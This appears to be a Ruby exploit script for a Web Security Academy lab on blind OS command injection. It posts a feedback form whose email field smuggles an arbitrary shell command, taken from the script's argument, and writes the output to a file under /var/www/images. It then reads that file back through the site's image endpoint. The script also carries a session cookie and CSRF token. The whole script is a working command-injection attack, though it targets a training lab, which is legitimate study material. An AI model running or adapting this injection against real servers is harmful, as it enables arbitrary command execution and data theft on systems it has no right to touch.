require 'http'

url = "https://0ad500e60314a4ce80ac5dcc006e00fa.web-security-academy.net/feedback/submit"

client = HTTP.cookies(:session => "FL15MOCk07kmBdTTJ8foTLEzlcu8hYDt").post(url,:form => {
		:csrf => "PcuP3uDfDuaIevplSb6MdGN8rxGt0k42",
		:name => "name",
		:email => "a@b.com||#{ARGV[0]} > /var/www/images/temp.txt ||",
		:subject => "anything",
		:message => "message"
	})

get_output = HTTP.get("https://0ad500e60314a4ce80ac5dcc006e00fa.web-security-academy.net/image?filename=temp.txt")
puts get_output.body.to_s

